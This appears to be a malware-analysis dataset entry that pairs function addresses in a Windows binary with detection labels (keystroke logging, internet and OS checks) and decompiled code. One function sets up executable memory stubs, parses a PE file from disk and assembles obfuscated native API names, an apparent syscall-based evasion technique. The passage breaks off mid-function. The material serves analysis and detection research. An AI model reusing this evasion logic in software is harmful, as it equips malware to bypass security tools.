{
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "14000118": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140001180(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    uint32_t *puVar5;\n    uint64_t *puVar6;\n    int32_t *piVar7;\n    ulong uVar8;\n    uint32_t uVar9;\n    code *pcVar10;\n    ulong uVar11;\n    char **ppcVar12;\n    char *pcVar13;\n    ulong *puVar14;\n    int64_t iVar15;\n    uint64_t uVar16;\n    bool bVar17;\n    int64_t iVar18;\n    uint64_t uVar19;\n    ulong unaff_RBX;\n    int64_t iVar20;\n    ulong *puVar21;\n    ulong unaff_RBP;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    ulong unaff_R12;\n    int64_t in_GS_OFFSET;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    ulong in_stack_00000098;\n    ulong in_stack_000000a0;\n    ulong in_stack_000000a8;\n    ulong in_stack_000000b0;\n    ulong in_stack_000000b8;\n    ulong in_stack_000000c0;\n    ulong in_stack_000000c8;\n    ulong in_stack_000000d0;\n    ulong in_stack_000000d8;\n    ulong in_stack_000000e0;\n    ulong in_stack_000000e8;\n    ulong in_stack_000000f0;\n    ulong in_stack_000000f8;\n    ulong in_stack_00000100;\n    ulong in_stack_00000108;\n    ulong in_stack_00000110;\n    ulong in_stack_00000118;\n    ulong in_stack_00000120;\n    ulong in_stack_00000128;\n    ulong in_stack_00000130;\n    ulong in_stack_00000138;\n    ulong in_stack_00000140;\n    ulong in_stack_ffffffffffffff68;\n    ulong in_stack_ffffffffffffff70;\n    ulong in_stack_ffffffffffffff78;\n    ulong in_stack_ffffffffffffff80;\n    ulong in_stack_ffffffffffffff88;\n    ulong in_stack_ffffffffffffff90;\n    ulong in_stack_ffffffffffffff98;\n    uint in_stack_ffffffffffffffa0;\n    uint32_t in_stack_ffffffffffffffa4;\n    uint16_t in_stack_ffffffffffffffa8;\n    unkbyte6 in_stack_ffffffffffffffaa;\n    ulong in_stack_ffffffffffffffb0;\n    ulong in_stack_ffffffffffffffb8;\n    ulong in_stack_ffffffffffffffc0;\n    ulong in_stack_ffffffffffffffc8;\n    ulong in_stack_ffffffffffffffd0;\n    \n    puVar5 = *0x1401108b0;\n    puVar21 = &stack0xffffffffffffff68;\n    for (iVar18 = 0xd; iVar18 != 0; iVar18 = iVar18 + -1) {\n        *puVar21 = 0;\n        puVar21 = puVar21 + 1;\n    }\n    uVar16 = **0x1401108b0;\n    if (**0x1401108b0 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(&stack0xffffffffffffff68);\n    }\n    pcVar10 = _sym.imp.KERNEL32.dll_Sleep;\n    puVar6 = *0x140110900;\n    uVar19 = *(*(in_GS_OFFSET + 0x30) + 8);\n    while( true ) {\n        LOCK();\n        uVar4 = *puVar6;\n        *puVar6 = *puVar6 ^ (uVar4 == 0) * (*puVar6 ^ uVar19);\n        uVar8 = *0x140110970;\n        uVar11 = *0x140110960;\n        piVar7 = *0x140110910;\n        uVar4 = (uVar4 != 0) * *puVar6;\n        if (uVar4 == 0) break;\n        if (uVar19 == uVar4) {\n            bVar17 = true;\n            iVar3 = **0x140110910;\n            goto joined_r0x000140001401;\n        }\n        (*pcVar10)(1000);\n    }\n    bVar17 = false;\n    iVar3 = **0x140110910;\njoined_r0x000140001401:\n    if (iVar3 == 1) {\n        sub.msvcrt.dll__amsg_exit(0x1f);\n        iVar3 = *piVar7;\n    }\n    else {\n        if (**0x140110910 == 0) {\n            **0x140110910 = 1;\n            sub.msvcrt.dll__initterm(uVar11, uVar8);\n        }\n        else {\n            *0x14013601c = 1;\n        }\n        iVar3 = *piVar7;\n    }\n    if (iVar3 == 1) {\n        sub.msvcrt.dll__initterm(*0x140110940, *0x140110950);\n        *piVar7 = 2;\n    }\n    if (!bVar17) {\n        *puVar6 = 0;\n    }\n    if (**0x140110840 != NULL) {\n        (***0x140110840)(0, 2);\n    }\n    fcn.140013bf0();\n    uVar11 = (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(*0x1401109b0);\n    **0x1401108f0 = uVar11;\n    fcn.14001dee0(0x140001000);\n    fcn.140013a00();\n    *0x140136010 = *0x140110860;\n    ppcVar12 = fcn.14001dd30();\n    uVar9 = *0x140136038;\n    bVar17 = false;\n    pcVar13 = *ppcVar12;\n    if (pcVar13 != NULL) {\n        do {\n            cVar2 = *pcVar13;\n            if (cVar2 < '!') {\n                *0x140136008 = pcVar13;\n                if (cVar2 == '\\0') break;\n                if (!bVar17) goto code_r0x0001400012d0;\n                bVar17 = true;\n            }\n            else if (cVar2 == '\\\"') {\n                bVar17 = bVar17 ^ 1;\n            }\n            pcVar13 = pcVar13 + 1;\n        } while( true );\n    }\n    goto code_r0x0001400012f0;\ncode_r0x0001400012d0:\n    if (cVar2 != '\\0') {\n        do {\n            pcVar1 = pcVar13 + 1;\n            pcVar13 = pcVar13 + 1;\n            *0x140136008 = pcVar13;\n            if (*pcVar1 == '\\0') break;\n        } while (*pcVar1 < '!');\n    }\ncode_r0x0001400012f0:\n    if ((*puVar5 != 0) && (*0x1400be000 = 10,  (in_stack_ffffffffffffffa4 & 1) != 0)) {\n        *0x1400be000 = in_stack_ffffffffffffffa8;\n    }\n    iVar3 = *0x140136038 + 1;\n    puVar14 = sub.msvcrt.dll_malloc();\n    iVar18 = *0x140136030;\n    puVar21 = puVar14;\n    if (0 < uVar9) {\n        iVar20 = 0;\n        do {\n            iVar15 = sub.msvcrt.dll_strlen(*(iVar18 + iVar20));\n            uVar11 = sub.msvcrt.dll_malloc(iVar15 + 1);\n            *(puVar14 + iVar20) = uVar11;\n            puVar21 = iVar18 + iVar20;\n            iVar20 = iVar20 + 8;\n            sub.msvcrt.dll_memcpy(uVar11, *puVar21, iVar15 + 1);\n        } while (iVar20 != iVar3 * 8 + -8);\n        puVar21 = iVar20 + puVar14;\n    }\n    *puVar21 = 0;\n    *0x140136030 = puVar14;\n    fcn.140013800();\n    uVar11 = *0x140136028;\n    uVar19 = *0x140136038;\n    ***0x140110870 = *0x140136028;\n    uVar16 = fcn.14000391d(uVar19, *0x140136030, uVar11, uVar16, in_stack_ffffffffffffff68, in_stack_ffffffffffffff70, \n                           in_stack_ffffffffffffff78, in_stack_ffffffffffffff80, in_stack_ffffffffffffff88, \n                           in_stack_ffffffffffffff90, in_stack_ffffffffffffff98, \n                           CONCAT44(in_stack_ffffffffffffffa4, in_stack_ffffffffffffffa0), \n                           CONCAT62(in_stack_ffffffffffffffaa, in_stack_ffffffffffffffa8), in_stack_ffffffffffffffb0, \n                           in_stack_ffffffffffffffb8, in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, \n                           in_stack_ffffffffffffffd0, unaff_RBX, unaff_RSI, unaff_RDI, unaff_RBP, unaff_R12, \n                           in_stack_00000000, in_stack_00000008, in_stack_00000010, in_stack_00000018, in_stack_00000020\n                           , in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                           in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, in_stack_00000068\n                           , in_stack_00000070, in_stack_00000078, in_stack_00000080, in_stack_00000088, \n                           in_stack_00000090, in_stack_00000098, in_stack_000000a0, in_stack_000000a8, in_stack_000000b0\n                           , in_stack_000000b8, in_stack_000000c0, in_stack_000000c8, in_stack_000000d0, \n                           in_stack_000000d8, in_stack_000000e0, in_stack_000000e8, in_stack_000000f0, in_stack_000000f8\n                           , in_stack_00000100, in_stack_00000108, in_stack_00000110, in_stack_00000118, \n                           in_stack_00000120, in_stack_00000128, in_stack_00000130, in_stack_00000138, in_stack_00000140\n                          );\n    *0x140136024 = uVar16;\n    if (*0x140136020 == 0) {\n        sub.msvcrt.dll_exit(uVar16 & 0xffffffff);\n        **0x1401108b0 = 1;\n        uVar16 = fcn.140001180();\n        return uVar16;\n    }\n    if (*0x14013601c == 0) {\n        sub.msvcrt.dll__cexit();\n        return *0x140136024;\n    }\n    return uVar16;\n}\n",
        "token_count": 2636
    },
    "1400014f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.1400014f0(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll__onexit();\n    return -(iVar1 == 0);\n}\n",
        "token_count": 46
    },
    "14000391": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint fcn.14000391d(ulong noname_0, ulong noname_1, ulong noname_2, ulong noname_3, ulong arg_30h, ulong arg_38h, \n                  ulong arg_40h, ulong arg_48h, ulong arg_50h, ulong arg_58h, ulong arg_60h, ulong arg_68h, \n                  ulong arg_70h, ulong arg_78h, ulong noname_14, ulong noname_15, ulong noname_16, ulong noname_17, \n                  ulong noname_18, ulong noname_19, ulong noname_20, ulong noname_21, ulong noname_22, ulong noname_23, \n                  ulong noname_24, ulong noname_25, ulong noname_26, ulong noname_27, ulong noname_28, ulong noname_29, \n                  ulong noname_30, ulong noname_31, ulong noname_32, ulong noname_33, ulong noname_34, ulong noname_35, \n                  ulong noname_36, ulong noname_37, ulong noname_38, ulong noname_39, ulong noname_40, ulong noname_41, \n                  ulong noname_42, ulong noname_43, ulong noname_44, ulong noname_45, ulong noname_46, ulong noname_47, \n                  ulong noname_48, ulong noname_49, ulong arg_1a0h, ulong arg_1a8h, ulong arg_1b0h, ulong arg_1b8h, \n                  ulong arg_1c0h, ulong noname_55, ulong arg_1d0h, ulong noname_57, ulong noname_58, ulong noname_59, \n                  ulong noname_60, ulong arg_1f8h, ulong arg_200h, ulong arg_208h)\n\n{\n    ulong *puVar1;\n    bool bVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    uint unaff_EBX;\n    ulong uVar8;\n    uchar *arg3;\n    code *arg3_00;\n    uchar *puVar9;\n    int64_t iStackX8;\n    ulong uStackX16;\n    ulong auStackX24 [2];\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    var_18h = 0x14000392a;\n    iVar5 = fcn.1400147b0(noname_0);\n    iVar5 = -iVar5;\n    puVar1 = &fcn.14000391d::arg_70h + iVar5;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000393a;\n    fcn.140013800();\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003943;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    *(&stack0x00003030 + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003965;\n    uVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, *(&stack0x00003030 + iVar5));\n    *(&stack0x00003028 + iVar5) = uVar6;\n    *(&stack0x00000008 + iVar5) = 0x40;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003998;\n    uVar6 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(*(&stack0x00003028 + iVar5), 0, 0x17, 0x1000);\n    *(&stack0x00003020 + iVar5) = uVar6;\n    *(&stack0x00003018 + iVar5) = *(&stack0x00003020 + iVar5) + 0x17;\n    *(&stack0x00003010 + iVar5) = *(&stack0x00003018 + iVar5) + 0x17;\n    *(&stack0x00003008 + iVar5) = *(&stack0x00003010 + iVar5) + 0x17;\n    *(&stack0x00003000 + iVar5) = *(&stack0x00003008 + iVar5) + 0x17;\n    *(&stack0x00002ff8 + iVar5) = *(&stack0x00003000 + iVar5) + 0x17;\n    *(&stack0x00002ff0 + iVar5) = *(&stack0x00002ff8 + iVar5) + 0x17;\n    *(&stack0x00002fe8 + iVar5) = *(&stack0x00002ff0 + iVar5) + 0x17;\n    *(&stack0x00002fe0 + iVar5) = *(&stack0x00002fe8 + iVar5) + 0x17;\n    *(&stack0x00002fd8 + iVar5) = *(&stack0x00002fe0 + iVar5) + 0x17;\n    *(&stack0x00002fd0 + iVar5) = *(&stack0x00002fd8 + iVar5) + 0x17;\n    *(&stack0x00002fc8 + iVar5) = *(&stack0x00002fd0 + iVar5) + 0x17;\n    *(&stack0x00002fc0 + iVar5) = *(&stack0x00002fc8 + iVar5) + 0x17;\n    *(&stack0x00002fb8 + iVar5) = *(&stack0x00002fc0 + iVar5) + 0x17;\n    *(&stack0x00002fb0 + iVar5) = *(&stack0x00002fb8 + iVar5) + 0x17;\n    *(&stack0x00002fa8 + iVar5) = *(&stack0x00002fb0 + iVar5) + 0x17;\n    *(&stack0x00002fa0 + iVar5) = *(&stack0x00002fa8 + iVar5) + 0x17;\n    *(&stack0x00000268 + iVar5) = 0;\n    *(&stack0x00000270 + iVar5) = 0;\n    *(&stack0x00000277 + iVar5) = 0;\n    *(&stack0x00000264 + iVar5) = 0;\n    *(&stack0x00002f98 + iVar5) = 0;\n    *(&stack0x00002f94 + iVar5) = 0;\n    *(&stack0x00000260 + iVar5) = 0;\n    *(&stack0x00002f88 + iVar5) = 0;\n    *0x140136048 = *(&stack0x00003020 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003b4a;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00003020 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x140136050 = *(&stack0x00003018 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003b80;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00003018 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x140136058 = *(&stack0x00003010 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003bb6;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00003010 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x140136060 = *(&stack0x00003008 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003bec;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00003008 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x140136068 = *(&stack0x00003000 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003c22;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00003000 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x140136070 = *(&stack0x00002ff8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003c58;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002ff8 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x140136078 = *(&stack0x00002ff0 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003c8e;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002ff0 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x140136080 = *(&stack0x00002fe8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003cc4;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002fe8 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x140136088 = *(&stack0x00002fe0 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003cfa;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002fe0 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x140136090 = *(&stack0x00002fd8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003d30;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002fd8 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x140136098 = *(&stack0x00002fd0 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003d66;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002fd0 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x1401360a0 = *(&stack0x00002fc8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003d9c;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002fc8 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x1401360a8 = *(&stack0x00002fc0 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003dd2;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002fc0 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x1401360b0 = *(&stack0x00002fb8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003e08;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002fb8 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x1401360b8 = *(&stack0x00002fb0 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003e3e;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002fb0 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x1401360c0 = *(&stack0x00002fa8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003e74;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002fa8 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *0x1401360c8 = *(&stack0x00002fa0 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003eaa;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*(&stack0x00002fa0 + iVar5), 0x17, 0x40, &stack0x00000264 + iVar5);\n    *(&stack0x00000018 + iVar5) = 0;\n    *(&stack0x00000010 + iVar5) = 0x80;\n    *(&stack0x00000008 + iVar5) = 3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003ee7;\n    uVar6 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x14010a519, 0x80000000, 1, 0);\n    *(&stack0x00002f98 + iVar5) = uVar6;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003f06;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetFileSize)(*(&stack0x00002f98 + iVar5), 0);\n    *(&stack0x00002f94 + iVar5) = uVar3;\n    uVar3 = *(&stack0x00002f94 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003f1b;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003f2f;\n    uVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6, 0, uVar3);\n    *(&stack0x00002f88 + iVar5) = uVar6;\n    *(&stack0x00000008 + iVar5) = 0;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140003f6c;\n    (*_sym.imp.KERNEL32.dll_ReadFile)\n              (*(&stack0x00002f98 + iVar5), *(&stack0x00002f88 + iVar5), *(&stack0x00002f94 + iVar5), \n               &stack0x00000260 + iVar5);\n    *(&stack0x00002f80 + iVar5) = *(&stack0x00002f88 + iVar5);\n    *(&stack0x00002f78 + iVar5) = *(&stack0x00002f88 + iVar5) + *(*(&stack0x00002f80 + iVar5) + 0x3c);\n    *(&stack0x00002f74 + iVar5) = *(*(&stack0x00002f78 + iVar5) + 0x88);\n    *(&stack0x00003040 + iVar5) = *(&stack0x00002f78 + iVar5) + *(*(&stack0x00002f78 + iVar5) + 0x14) + 0x18;\n    *(&stack0x00002f68 + iVar5) = *(&stack0x00003040 + iVar5);\n    *(&stack0x00003038 + iVar5) = *(&stack0x00003040 + iVar5);\n    *(&stack0x00003034 + iVar5) = 0;\n    while (*(&stack0x00003034 + iVar5) < *(*(&stack0x00002f78 + iVar5) + 6)) {\n        *(&fcn.14000391d::var_18h + iVar5) = 0x14000400c;\n        iVar4 = sub.msvcrt.dll_strcmp(*(&stack0x00003040 + iVar5));\n        if (iVar4 == 0) {\n            *(&stack0x00003038 + iVar5) = *(&stack0x00003040 + iVar5);\n            break;\n        }\n        *(&stack0x00003040 + iVar5) = *(&stack0x00003040 + iVar5) + 0x28;\n        *(&stack0x00003034 + iVar5) = *(&stack0x00003034 + iVar5) + 1;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004065;\n    uVar6 = fcn.140001590(*(&stack0x00002f74 + iVar5) + *(&stack0x00002f88 + iVar5), *(&stack0x00003038 + iVar5));\n    *(&stack0x00002f60 + iVar5) = uVar6;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000407b;\n    fcn.140072260(&stack0x00000557 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000409b;\n    fcn.1400a9bc0(&stack0x00000528 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00000557 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400040b8;\n    fcn.1400ba740(&stack0x00000508 + iVar5, &stack0x00000528 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400040d5;\n    fcn.1400ba740(&stack0x000004e8 + iVar5, &stack0x00000508 + iVar5, \n                  L\"AlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400040f2;\n    fcn.1400ba740(&stack0x000004c8 + iVar5, &stack0x000004e8 + iVar5, \n                  L\"locaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000410f;\n    fcn.1400ba740(&stack0x000004a8 + iVar5, &stack0x000004c8 + iVar5, \n                  L\"locaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000412c;\n    fcn.1400ba740(&stack0x00000488 + iVar5, &stack0x000004a8 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004149;\n    fcn.1400ba740(&stack0x00000468 + iVar5, &stack0x00000488 + iVar5, \n                  L\"caeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004166;\n    fcn.1400ba740(&stack0x00000448 + iVar5, &stack0x00000468 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004183;\n    fcn.1400ba740(&stack0x00000428 + iVar5, &stack0x00000448 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400041a0;\n    fcn.1400ba740(&stack0x00000408 + iVar5, &stack0x00000428 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400041bd;\n    fcn.1400ba740(&stack0x000003e8 + iVar5, &stack0x00000408 + iVar5, \n                  L\"ViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400041da;\n    fcn.1400ba740(&stack0x000003c8 + iVar5, &stack0x000003e8 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400041f7;\n    fcn.1400ba740(&stack0x000003a8 + iVar5, &stack0x000003c8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004214;\n    fcn.1400ba740(&stack0x00000388 + iVar5, &stack0x000003a8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004231;\n    fcn.1400ba740(&stack0x00000368 + iVar5, &stack0x00000388 + iVar5, \n                  L\"uMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000424e;\n    fcn.1400ba740(&stack0x00000348 + iVar5, &stack0x00000368 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000426b;\n    fcn.1400ba740(&stack0x00000328 + iVar5, &stack0x00000348 + iVar5, \n                  L\"locaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004288;\n    fcn.1400ba740(&stack0x00000308 + iVar5, &stack0x00000328 + iVar5, \n                  L\"Mmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400042a5;\n    